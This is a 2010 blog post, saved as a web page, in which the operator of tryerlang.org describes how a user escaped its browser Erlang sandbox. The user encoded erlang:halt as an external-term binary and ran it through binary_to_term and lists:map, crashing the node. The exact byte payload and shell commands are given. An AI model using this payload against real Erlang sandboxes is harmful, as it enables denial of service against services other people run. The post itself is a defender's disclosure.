
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>How they tried to fool tryerlang.org - Roberto Aloi</title>
  <meta name="author" content="Roberto Aloi">

  
  <meta name="description" content="Preface tryerlang.org is an interactive Erlang Shell which allows users to try the power of Erlang directly in a browser, without requiring them to &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://roberto-aloi.com/blog/2010/10/14/how-they-tried-to-fool-tryerlang-org/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="Roberto Aloi" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-24052324-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Roberto Aloi</a></h1>
  
    <h2>Software Engineer, Erlang Passionate, Father.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:roberto-aloi.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">How They Tried to Fool tryerlang.org</h1>
    
    
      <p class="meta">
        








  


<time datetime="2010-10-14T00:00:00+02:00" pubdate data-updated="true">Oct 14<span>th</span>, 2010</time>
        
      </p>
    
  </header>


<div class="entry-content"><h2>Preface</h2>


<p><a title="tryerlang.org" href="http://tryerlang.org" target="_blank">tryerlang.org</a> is an <em>interactive Erlang Shell</em> which allows users to try the power of Erlang directly in a browser, without requiring them to install an Erlang runtime system on their machine. Even if intended for Erlang newbies, tryerlang.org has been subjected to a countless number of attacks conducted by Erlang experts who wanted to circumvent its sandboxing mechanism and to bring down the Erlang node running the application. I must admit that going through the tryerlang.org&#8217;s logs is being an highly interesting and constructive experience.</p>

<p>In this blog post I will present one of the most elaborated attacks performed on tryerlang.org. The attack, which exploits the Erlang <em>External Term Representation</em>, has been performed by a former <a href="http://www.erlang-solutions.com" target="_blank">Erlang Solutions</a>&#8217; employee who had access to the tryerlang.org source code. To understand how the attack works, we need to introduce the Erlang <em>External Term Representation</em>.</p>

<h2>External Term Representation</h2>


<p>In Distributed Erlang, terms can be transferred from an Erlang node to another one using the so-called <em>binary</em> format. Generic terms are encoded in binary from the sender using the built-in function <code>term_to_binary/1</code> and restored from the receiver using the complementary function <code>binary_to_term/2</code>. A binary message looks like this:</p>

<pre>
<<131,100,0,6,112,105,103,101,111,110>>
</pre>


<p>Which, as you can see, represents the binary encoding of the atom <code>pigeon</code>.</p>

<pre>
1&gt; term_to_binary(pigeon).
&lt;&lt;131,100,0,6,112,105,103,101,111,110&gt;&gt;
2&gt; binary_to_term(&lt;&lt;131,100,0,6,112,105,103,101,111,110&gt;&gt;).
pigeon
</pre>


<p>The <em>External Term Representation</em> of Erlang terms is extensively documented in <a title="Erlang External Term Representation" href="http://www.erlang.org/doc/apps/erts/erl_ext_dist.html" target="_blank">the official Erlang Documentation</a>. Let&#8217;s see how the attacker used this concept in his own interest.</p>

<h2>Halting the Erlang Node</h2>


<p>To stop the Erlang node running tryerlang.org, the attacker tries at first the following command:</p>

<pre>
&gt; erlang:halt().
</pre>


<p>This function, documented <a title="Erlang Halt" href="http://www.erlang.org/doc/man/erlang.html#halt-0" target="_blank">here</a>, is supposed to <em>halt</em> an Erlang runtime system, indicating a normal exit to the calling environment. The function has been disabled in tryerlang.org for security reasons, so the only result the user get is the following annoying message:</p>

<pre>
"This functionality has been disabled for security reasons in tryerlang.org.".
</pre>


<p>So, the Erlang node is still up and attacker prepares himself a good cup of Swedish coffee. After a couple of minutes playing with the tryerlang.org shell, the attcker notices that tryerlang.org allows you to define custom <a title="Erlang Funs" href="http://www.erlang.org/doc/programming_examples/funs.html" target="_blank">funs</a>. Then, the intuition. A <em>fun</em>, as any other Erlang term, <a title="export_ext" href="http://www.erlang.org/doc/apps/erts/erl_ext_dist.html#id83276" target="_blank">can be encoded using the External Terms Representation</a>. The encoded fun could then be executed. This could hopefully fool the sandboxing mechanism protecting the tryerlang.org and could open a world of possibilities to the attacker.</p>

<p>According to the documentation, the external representation of the fun (in the <code>fun M:F/A</code> format) is the following:</p>

<pre>
113 | Module | Function | Arity
</pre>


<p>Where <code>Module</code> and <code>Function</code> are atoms and <code>Arity</code> is an integer.</p>

<p>Atoms themselves can be encoded using the <a title="atom ext" href="http://www.erlang.org/doc/apps/erts/erl_ext_dist.html#ATOM_EXT" target="_blank">ATOM_EXT</a> format:</p>

<pre>
100 | Len | AtomName
</pre>


<p>Where <code>Len</code> is the length of <code>AtomName</code>, expressed using two bytes.</p>

<p>For the atom <code>erlang</code>, which is composed of 6 characters (the letters <code>e</code>, <code>r</code>, <code>l</code>, <code>a</code>, <code>n</code> and <code>g</code>) we obtain:</p>

<pre>
100 | 0, 6 | 101, 114, 108, 97, 110, 103
</pre>


<p>Where the integers in the third section are the ASCII codes for each of the letters composing the word &#8220;erlang&#8221;.</p>

<p>Applying the same reasoning to the atom <code>halt</code>, we obtain:</p>

<pre>
100 | 0, 4 | 104, 97, 108, 116
</pre>


<p>Finally, the arity (an integer) can be encoded using the <a title="small integer ext" href="http://www.erlang.org/doc/apps/erts/erl_ext_dist.html#id80902" target="_blank">SMALL_INTEGER_EXT</a> format:</p>

<pre>
97 | Int
</pre>


<p>So, in our case (arity = 0) we obtain:</p>

<pre>
97 | 0
</pre>


<p>Putting all the pieces together and considering that, in the External Term Representation, the byte <code>131</code> needs to be prepended to the final term, we can encode the <code>erlang:halt/</code>0 function into binary, obtaining:</p>

<pre>
&lt;&lt;131,113,100,0,6,101,114,108,97,110,103,100,0,4,104,97,108,116,97,0&gt;&gt;
</pre>


<p>Let&#8217;s verify that we didn&#8217;t do any mistake:</p>

<pre>
&gt; binary_to_term(&lt;&lt;131,113,100,0,6,101,114,108,97,110,103,100,0,4,104,97,108,116,97,0&gt;&gt;).
&gt; #Fun&lt;erlang.halt.0&gt;
</pre>


<p>Since tryerlang.org doesn&#8217;t support copy-and-paste from the clipboard, we need to insert the sequence above by hand.</p>

<p>We can bind the binary to a new variable:</p>

<pre>
&gt; B =Â &lt;&lt;131,113,100,0,6,101,114,108,97,110,103,100,0,4,104,97,108,116,97,0&gt;&gt;.
</pre>


<p>We now need to convert the binary into an Erlang term. Originally, tryerlang.org was allowing <a title="Erlang Safe Binary To Term" href="http://www.erlang.org/doc/man/erlang.html#binary_to_term-2" target="_blank">the binary_to_term function in safe mode</a>. This function has been now completely disabled after this attack. If you want to try what follows you will need to do it in your own Erlang shell.</p>

<pre>
&gt; F = binary_to_term(B, [safe]).
</pre>


<p>Let&#8217;s now try to launch the fun as:</p>

<pre>
&gt;F().
</pre>


<p>Well, that didn&#8217;t work as expected. tryerlang.org actually realized that the <code>erlang:halt/0</code> function was going to be called and the sandboxing mechanism managed to block the execution of the command. We need to do something slightly different. For example, we might pass the newly defined fun as an argument (after all, Erlang is a functional language) to a function who would take care of executing it. As an example, we could use the library function <code>lists:map/2</code>. There&#8217;s only a little tiny problem with that. The <code>list:map/2</code> function, in fact, requires that the fun passed as an argument receives <em>exactly one argument</em>. This is not the case of the <code>erlang:halt/0</code> function, which has arity equal to zero. Fortunately <a href="http://www.erlang.org/doc/man/erlang.html#halt-1" target="_blank">an alternative version of <code>erlang:halt/0</code> exists, taking exactly one argument</a>. The external representation for the new function differs from the previous one by only the very last byte. Let&#8217;s <em>forget</em> the old value of the variable <code>B</code> and let&#8217;s bind it to the new binary:</p>

<pre>
&gt; f(B).
&gt; B = &lt;&lt;131,113,100,0,6,101,114,108,97,110,103,100,0,4,104,97,108,116,97,1&gt;&gt;.
</pre>


<p>We can now pass the new fun as an argument to the <code>lists:map</code> function:</p>

<pre>
&gt; f(F).
&gt; F = binary_to_term(B, [safe]).
&gt;lists:map(F, [0]).
</pre>


<p>And the node dies. Well, in reality the node is almost immediately brought back by <a title="Erlang Heart" href="http://www.erlang.org/doc/man/heart.html" target="_blank">heart</a> which is listening for heartbeats from the Erlang node itself but, hey, I have to pay a beer to this guy! :)</p>

<p>I wanted to share this experience with all of you. I consider it highly constructive, since it leads to reflect on several aspects of Erlang. Comments and feedback are more than welcome.</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Roberto Aloi</span></span>

      








  


<time datetime="2010-10-14T00:00:00+02:00" pubdate data-updated="true">Oct 14<span>th</span>, 2010</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/erlang/'>erlang</a>, <a class='category' href='/blog/categories/hacking/'>hacking</a>, <a class='category' href='/blog/categories/restrictions/'>restrictions</a>, <a class='category' href='/blog/categories/sandbox/'>sandbox</a>, <a class='category' href='/blog/categories/tryerlang/'>tryerlang</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://roberto-aloi.com/blog/2010/10/14/how-they-tried-to-fool-tryerlang-org/" data-via="robertoaloi" data-counturl="http://roberto-aloi.com/blog/2010/10/14/how-they-tried-to-fool-tryerlang-org/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2009/02/19/emacs-tips-and-tricks/" title="Previous Post: Emacs Tips and Tricks">&laquo; Emacs Tips and Tricks</a>
      
      
        <a class="basic-alignment right" href="/blog/2012/09/12/history-of-a-generation/" title="Next Post: History of a Generation">History of a Generation &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <div align="center">
    <img src="/images/keep-calm-code-erlang.png" alt="" width="80%" />
  </div>
</section>
<section>
  <h1>Related</h1>
  <ul id="related">
    <li class="post">
      <a target="_blank" href="http://www.tryerlang.org">tryerlang.org</a>
    </li>
    <li class="post">
      <a target="_blank" href="http://roberto-aloi.com/languagesintheworld">Languages in the world</a>
    </li>
  </ul>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2012/12/12/ever-wondered-which-application-a-given-erlang-module-belongs-to/">Ever wondered which application a given Erlang module belongs to?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2012/11/17/slides-from-my-erlang-codemotion-talk-available-online/">'Erlang and the Cloud' Codemotion slides available online</a>
      </li>
    
      <li class="post">
        <a href="/blog/2012/11/15/codemotion-venice-2012-erlang-and-the-cloud/">Codemotion Venice 2012: Erlang and the Cloud</a>
      </li>
    
  </ul>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <li class="loading">Status updating...</li>
  </ul>
  <script type="text/javascript">
    $.domReady(function(){
      getTwitterFeed("robertoaloi", 4, false);
    });
  </script>
  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
  
    <a href="http://twitter.com/robertoaloi" class="twitter-follow-button" data-show-count="true">Follow @robertoaloi</a>
  
</section>




  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - Roberto Aloi -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'robertoaloi';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://roberto-aloi.com/blog/2010/10/14/how-they-tried-to-fool-tryerlang-org/';
        var disqus_url = 'http://roberto-aloi.com/blog/2010/10/14/how-they-tried-to-fool-tryerlang-org/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
